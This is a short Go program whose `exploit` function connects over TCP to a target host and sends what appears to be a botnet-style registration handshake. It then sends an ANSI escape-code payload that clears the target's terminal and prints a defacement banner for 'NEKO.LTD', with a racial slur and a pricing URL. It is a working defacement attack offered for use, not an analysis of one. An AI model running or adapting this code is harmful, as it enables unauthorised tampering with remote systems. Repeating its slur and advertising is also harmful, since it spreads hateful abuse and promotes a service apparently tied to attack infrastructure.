package main

import (
    "fmt"
    "net"
    "sync"
    "time"
    "math/rand"
    //"strconv"
    //"io/ioutil"
    //"bufio"
    //"os"
)

func exploit(host string) {

    var wg sync.WaitGroup

    var message = []string{
                        "[2J[5;20H[KDEFACED BY NEKO.LTD[0K[6;8H[KDon't get scammed by niggers with shit sources[0K[7;22H[KBUY NEKO TODAY![0K[8;17H[Khttps://neko.ltd/prices[0K[3B",                  
    }
    //var indent = 3

    var payload [][]byte
    //payload = append(payload, []byte("breh"))

    for i := range message {
        payload = append(payload, []byte{})
        //message[i] = strings.ReplaceAll(message[i], " ", "-")

        payload[i] = []byte(fmt.Sprintf("[2K[1m%s",message[i]))
    }
    for i := 0; i < 1; i++ {
        wg.Add(1)
        func(i int) {
            //rand.Seed(time.Now().Unix())
            n := rand.Int() % len(payload)
            if err := connect(host, payload[n]); err != nil {
                fmt.Println(" [i] disconnected")
            }
            wg.Done()
        }(i)
        continue
    }

    wg.Wait()
}

func connect(host string, source []byte) error {
    conn, err := net.Dial("tcp", host)
    if err != nil {
        return err
    }

    //fmt.Println(" [i] TCP Connected")

    if _, err = conn.Write([]byte{0x00, 0x00, 0x00, 4}); err != nil {
        return err
    }

    time.Sleep(time.Second)

    if _, err = conn.Write([]byte{uint8(len(source))}); err != nil {
        return err
    }
    if _, err = conn.Write(source); err != nil {
        return err
    }

    //fmt.Println(" [i] Registered")
    for {
        buf := make([]byte, 200)
        n, err := conn.Read(buf)
        if err != nil {
            fmt.Println(buf[:n])
            fmt.Println(string(buf[:n]))
            return err
        }
        
    }
}